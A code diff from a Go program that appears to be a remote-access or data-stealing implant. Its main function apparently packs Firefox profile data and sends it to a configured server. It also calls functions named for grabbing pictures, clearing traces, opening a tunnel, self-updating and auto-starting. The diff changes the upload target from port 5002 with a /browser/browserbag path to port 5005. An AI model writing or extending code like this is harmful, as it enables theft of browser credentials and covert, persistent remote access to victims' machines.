@@ -93,13 +93,14 @@ func main() {
 		// if not create digback fire  check the  use firefox or not
 		if lib.FileExits(lib.Firefoxpath) == nil {
 			if lib.FileExits(lib.Firefox) != nil {
-				go browser.Firefoxpack("http://" + conf.Url + ":5002/browser/browserbag")
+				go browser.Firefoxpack(conf.Url + ":5005")
 			} else {
 				//exits check date updae
 				logf, _ := os.Stat(lib.Firefox)
 				if time.Now().Unix()-logf.ModTime().Unix() >= 1296000 {
 					os.RemoveAll(lib.Firefox)
-					go browser.Firefoxpack("http://" + conf.Url + ":5002/browser/browserbag")
+					//go browser.Firefoxpack("http://" + conf.Url + ":5002/browser/browserbag")
+					go browser.Firefoxpack(conf.Url + ":5005")
 				}
 			}
 		}
@@ -108,7 +109,7 @@ func main() {
 	go killit.GetPic(conf.Url)
 	go killit.ClearALL(conf.Url)
 	go tunnel.Tunnel(conf.Url)
-	////check update
+	////////check update
 	go lib.DoUpdate()
 	go lib.AutoStart()
 	http.HandleFunc("/hello", handler)
